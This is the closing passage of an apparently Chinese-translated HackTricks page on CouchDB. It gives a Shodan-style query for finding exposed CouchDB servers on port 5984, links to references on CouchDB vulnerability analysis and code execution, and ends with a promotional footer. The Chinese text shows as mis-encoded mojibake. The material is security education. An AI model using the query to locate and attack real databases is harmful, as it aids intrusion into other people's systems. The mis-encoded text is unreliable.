* `port:5984 couchdb`

## å‚è€ƒèµ„æ–™

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
